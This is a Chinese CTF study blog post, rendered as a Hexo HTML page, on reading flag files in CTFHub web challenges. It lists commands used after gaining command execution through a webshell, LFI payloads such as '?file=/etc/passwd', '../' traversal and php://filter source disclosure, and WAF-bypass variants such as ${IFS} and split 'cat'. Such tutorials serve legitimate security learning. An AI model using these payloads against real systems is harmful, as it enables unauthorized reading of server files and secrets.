@@ -1,0 +1,929 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/Crow.github.io/img/fluid.png">
+  <link rel="icon" href="/Crow.github.io/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Crow.">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="写在前面:我们会遇见获取信息困难的情况,比如在Ctfhub中获取flag,有时网页中会返回空白,这时候往往需要用到base64获取信息再进行解码,于是我在ai的帮助下,在此梳理一些信息读取的方法. 分析Ctfhub中网页显白的原因: A.浏览器层面: 因为HTML是由各种标签组成的,在网页用Ctrl+U就能看见源码,你会发现里面有很多&lt;符号,浏览器遇见&lt;开头的,就会试图找到对应的标签.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="信息读取小专栏">
+<meta property="og:url" content="https://lzzy-rz.github.io/Crow.github.io/2026/11/09/%E4%BF%A1%E6%81%AF%E8%AF%BB%E5%8F%96%E5%B0%8F%E4%B8%93%E6%A0%8F/index.html">
+<meta property="og:site_name" content="Crow.">
+<meta property="og:description" content="写在前面:我们会遇见获取信息困难的情况,比如在Ctfhub中获取flag,有时网页中会返回空白,这时候往往需要用到base64获取信息再进行解码,于是我在ai的帮助下,在此梳理一些信息读取的方法. 分析Ctfhub中网页显白的原因: A.浏览器层面: 因为HTML是由各种标签组成的,在网页用Ctrl+U就能看见源码,你会发现里面有很多&lt;符号,浏览器遇见&lt;开头的,就会试图找到对应的标签.">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-11-09T15:33:50.000Z">
+<meta property="article:modified_time" content="2026-11-10T15:02:16.981Z">
+<meta property="article:author" content="Crow.">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="信息读取">
+<meta property="article:tag" content="小专栏">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>信息读取小专栏 - Crow.</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/Crow.github.io/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/Crow.github.io/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/Crow.github.io/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/Crow.github.io/css/article-images.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lzzy-rz.github.io","root":"/Crow.github.io/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/Crow.github.io/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/Crow.github.io/js/utils.js" ></script>
+  <script  src="/Crow.github.io/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/Crow.github.io/">
+      <strong>Crow.</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Crow.github.io/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Crow.github.io/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Crow.github.io/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Crow.github.io/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Crow.github.io/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/Crow.github.io/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>Home</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/Crow.github.io/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>Archives</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/Crow.github.io/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>Categories</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/Crow.github.io/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>Tags</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/Crow.github.io/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>About</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>Search</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="Light"
+               data-label-dark="Dark">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">Dark</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/Crow.github.io/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="信息读取小专栏"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-11-09 23:33" pubdate>
+          November 9, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.3k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">信息读取小专栏</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>写在前面:我们会遇见获取信息困难的情况,比如在Ctfhub中获取flag,有时网页中会返回空白,这时候往往需要用到base64获取信息再进行解码,于是我在ai的帮助下,在此梳理一些信息读取的方法.</p>
+<h2 id="分析Ctfhub中网页显白的原因"><a href="#分析Ctfhub中网页显白的原因" class="headerlink" title="分析Ctfhub中网页显白的原因:"></a>分析Ctfhub中网页显白的原因:</h2><ul>
+<li><strong>A.浏览器层面:</strong> 因为HTML是由各种标签组成的,在网页用Ctrl+U就能看见源码,你会发现里面有很多<code>&lt;</code>符号,浏览器遇见<code>&lt;</code>开头的,就会试图找到对应的标签.遇见<code>&lt;?</code>这种根本不认识的,不合规的标签结构,浏览器会直接把它当做”无效代码”给过滤掉,既不显示,也不报错.</li>
+<li><strong>B.服务器层面:</strong> 如果直接访问一个.php文件,服务器其实是先把它执行了,然后吐一个空壳给浏览器.如果执行没输出,浏览器拿到的就是空白.</li>
+</ul>
+<p>那么<code>&lt;</code>究竟来自于哪里呢?是我们的一句话木马里的<code>&lt;?</code>导致的吗?</p>
+<p>通过查询,我得出答案,不是的,是我们要查询的目标文件里的<code>&lt;</code>.因为Ctfhub中的flag经常放在.php文件中,所以里面用到的php语法自带有<code>&lt;</code>,而且这个php文件没有echo内容,因此没有回显</p>
+<h2 id="访问的两种情况"><a href="#访问的两种情况" class="headerlink" title="访问的两种情况:"></a>访问的两种情况:</h2><ul>
+<li><strong>A,</strong> 根据路径直接访问我们的目标文件，服务器端会执行目标文件（.php格式），但是由于这份文件里没有echo，所以没有回显</li>
+<li><strong>B,</strong> 通过调用一句话木马来读取目标文件，比如用curl，它尝试会将目标文件原封不动的显示出来，但是浏览器看到<code>&lt;？</code>却不认识，于是直接吃掉，干脆不显示</li>
+</ul>
+<p>与我们的一句话木马一点关系都没有.</p>
+<p>base64如何让浏览器放出内容？base64通过转码，将<code>&lt;</code>变成字母和数字的乱码让浏览器以为是正常的内容，于是输出显示.</p>
+<p>base64的优势在于简单粗暴，但是也有不足的地方：</p>
+<ul>
+<li><strong>a,</strong> 可能被高级一点的防火墙ban掉，实战环境中很多网站会将base64列为疑似黑客行为，不让执行，还可能留下记录</li>
+<li><strong>b,</strong> 长度:如果要读取的目标文件是长度比较大的，经过base64解码之后，长度更是会大大增加（会扩大33%），容易触发浏览器的URL限制，导致请求失败或者截断。</li>
+</ul>
+<h2 id="接下来，对不同场景下的的信息读取方法进行一个总结（来自于ai-个人进行了整理）"><a href="#接下来，对不同场景下的的信息读取方法进行一个总结（来自于ai-个人进行了整理）" class="headerlink" title="接下来，对不同场景下的的信息读取方法进行一个总结（来自于ai,个人进行了整理）"></a>接下来，对不同场景下的的信息读取方法进行一个总结（来自于ai,个人进行了整理）</h2><h3 id="A-RCE命令执行-比如通过一句话木马和命令注入等控制服务器后-在终端中执行"><a href="#A-RCE命令执行-比如通过一句话木马和命令注入等控制服务器后-在终端中执行" class="headerlink" title="A,RCE命令执行:比如通过一句话木马和命令注入等控制服务器后,在终端中执行"></a>A,RCE命令执行:比如通过一句话木马和命令注入等控制服务器后,在终端中执行</h3><h4 id="a-对普通文本-以flag-txt为例"><a href="#a-对普通文本-以flag-txt为例" class="headerlink" title="a,对普通文本:以flag.txt为例"></a>a,对普通文本:以flag.txt为例</h4><ul>
+<li><code>cat /flag</code>:最常用,一次性把全文打印出来</li>
+<li><code>tac /flag</code>:反向打印(从最后一行读到第一行),可以防过滤(当WAF把cat禁了,用tac往往可以实现绕过)</li>
+<li><code>nl /flag</code>:带行号打印(方便看清结构),同时也有防过滤的功能</li>
+<li><code>head -n 5 /flag 或 tail -n 5 /flag</code>:只看前5行或后五行</li>
+<li><code>more /flag 或 less /flag</code>:分页查看(按空格键翻页,按q退出)(偶尔用于防止网页卡死,但体验一般)</li>
+</ul>
+<h4 id="b-对-php源码-图片二进制"><a href="#b-对-php源码-图片二进制" class="headerlink" title="b,对.php源码,图片二进制:"></a>b,对.php源码,图片二进制:</h4><ul>
+<li><code>base64 /flag.php</code>:将文件内容转成base64编码</li>
+<li><code>xxd /flag.php 或 hexdump -C /flag.php</code>:转成十六进制(Hex)来看,用于base64被WAF屏蔽时</li>
+<li><code>strings /flag.png</code>:只提取文件里可打印的字符.(flag藏在图片或者二进制文件里,用这个可以过滤掉乱码)</li>
+</ul>
+<h4 id="c-搜索与定位-对知道的信息很少的的文件"><a href="#c-搜索与定位-对知道的信息很少的的文件" class="headerlink" title="c,搜索与定位(对知道的信息很少的的文件)"></a>c,搜索与定位(对知道的信息很少的的文件)</h4><ul>
+<li><code>ls -la</code>:查看当前目录所有文件(包括隐藏文件.flag)</li>
+<li><code>find / -name &quot;*flag*&quot; 2&gt;/dev/null</code>:全盘搜索文件名带flag的文件,其中2&gt;&#x2F;dev&#x2F;null是为了屏蔽没权限的报错,让屏幕干净.</li>
+<li><code>gre[ -r &quot;ctfhub&quot; /var/www/html/</code>:全盘搜索文件内容中包含ctfhub的文件</li>
+</ul>
+<h3 id="B-LFI-文件包含-任意文件读取-用过URL读"><a href="#B-LFI-文件包含-任意文件读取-用过URL读" class="headerlink" title="B,LFI(文件包含&#x2F;任意文件读取)用过URL读"></a>B,LFI(文件包含&#x2F;任意文件读取)用过URL读</h3><h4 id="a-直接用路径读取-普通文件"><a href="#a-直接用路径读取-普通文件" class="headerlink" title="a,直接用路径读取(普通文件)"></a>a,直接用路径读取(普通文件)</h4><ul>
+<li><code>?file=/etc/passwd</code>:直接读绝对路径</li>
+<li><code>?file=../../../../flag.txt</code>:用..&#x2F;往上跳目录读.</li>
+</ul>
+<h4 id="b-PHP伪协议读取-对付各种源码-可以防止-php文件被服务器执行"><a href="#b-PHP伪协议读取-对付各种源码-可以防止-php文件被服务器执行" class="headerlink" title="b,PHP伪协议读取(对付各种源码)(可以防止,php文件被服务器执行)"></a>b,PHP伪协议读取(对付各种源码)(可以防止,php文件被服务器执行)</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?file=php://filter/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>告诉服务器将源码的原文用base64的方式打包出来.</li>
+<li>解码后会得到纯净源码</li>
+</ul>
+<h3 id="C-客户端-外部工具读取-适用于网页限制太多的情况-直接在本地操作"><a href="#C-客户端-外部工具读取-适用于网页限制太多的情况-直接在本地操作" class="headerlink" title="C,客户端&#x2F;外部工具读取(适用于网页限制太多的情况,直接在本地操作)"></a>C,客户端&#x2F;外部工具读取(适用于网页限制太多的情况,直接在本地操作)</h3><ul>
+<li><strong>a,</strong> <code>curl http://网址/flag.php</code>:在终端中请求网页,直接拿到服务器的原样输出(避开浏览器吃字符的问题)</li>
+<li><strong>b,</strong> <code>Ctrl+U</code>:查看网页源码,看网页最初的样子</li>
+</ul>
+<h3 id="D-实战防拦截-如果cat-flag被WAF拦截了-说明空格或cat或-被拉黑了-这时候可以尝试一下变形"><a href="#D-实战防拦截-如果cat-flag被WAF拦截了-说明空格或cat或-被拉黑了-这时候可以尝试一下变形" class="headerlink" title="D,实战防拦截(如果cat &#x2F;flag被WAF拦截了,说明空格或cat或&#x2F;被拉黑了,这时候可以尝试一下变形)"></a>D,实战防拦截(如果cat &#x2F;flag被WAF拦截了,说明空格或cat或&#x2F;被拉黑了,这时候可以尝试一下变形)</h3><h4 id="a-空格被拦截"><a href="#a-空格被拦截" class="headerlink" title="a,空格被拦截"></a>a,空格被拦截</h4><ul>
+<li>用<code>${IFS}</code>代替空格:<code>cat${IFS}/flag</code></li>
+<li>用<code>&lt;</code>代替空格:<code>cat&lt;/flag</code></li>
+<li>用<code>%09</code>(Tab键)代替空格:<code>?cmd=cat%09/flag</code></li>
+</ul>
+<h4 id="b-cat被拦截"><a href="#b-cat被拦截" class="headerlink" title="b,cat被拦截"></a>b,cat被拦截</h4><ul>
+<li>用拼接:<code>ca&#39;&#39;t /flag</code>或<code>c\at /flag</code></li>
+<li>用通配符:<code>/bin/ca* /fla*</code></li>
+<li>用变量:<code>a=c;b=at;c=fl;d=ag; $a$b /$c$d</code></li>
+</ul>
+<h4 id="c-斜杠-被拦截了怎么办"><a href="#c-斜杠-被拦截了怎么办" class="headerlink" title="c,斜杠&#x2F;被拦截了怎么办"></a>c,斜杠&#x2F;被拦截了怎么办</h4><p>用环境变量代替:<code>cat ${PWD:0:1}flag</code> –&gt;PWD的第0到第一个字符刚好是&#x2F;</p>
+<hr>
+<p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/Crow.github.io/categories/%E4%BF%A1%E6%81%AF%E8%AF%BB%E5%8F%96/" class="category-chain-item">信息读取</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/Crow.github.io/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/Crow.github.io/tags/Web/" class="print-no-link">#Web</a>
+      
+        <a href="/Crow.github.io/tags/%E4%BF%A1%E6%81%AF%E8%AF%BB%E5%8F%96/" class="print-no-link">#信息读取</a>
+      
+        <a href="/Crow.github.io/tags/%E5%B0%8F%E4%B8%93%E6%A0%8F/" class="print-no-link">#小专栏</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>信息读取小专栏</div>
+      <div>https://lzzy-rz.github.io/Crow.github.io/2026/11/09/信息读取小专栏/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Crow.</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 9, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Crow.github.io/2026/11/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5/" title="文件上传(文件头检查)">
+                        <span class="hidden-mobile">文件上传(文件头检查)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"Lzzy-RZ/Crow.github.io","repo-id":"R_kgDOVRyAiA","category":"Announcements","category-id":"DIC_kwDOVRyAiM4DJjQE","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"bottom","lang":"zh-CN","strict":0};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/Lzzy-RZ" target="_blank" rel="noopener"><i class="iconfont icon-github-fill"></i> GitHub</a> <span class="mx-2">·</span> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/Crow.github.io/js/events.js" ></script>
+<script  src="/Crow.github.io/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/Crow.github.io/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
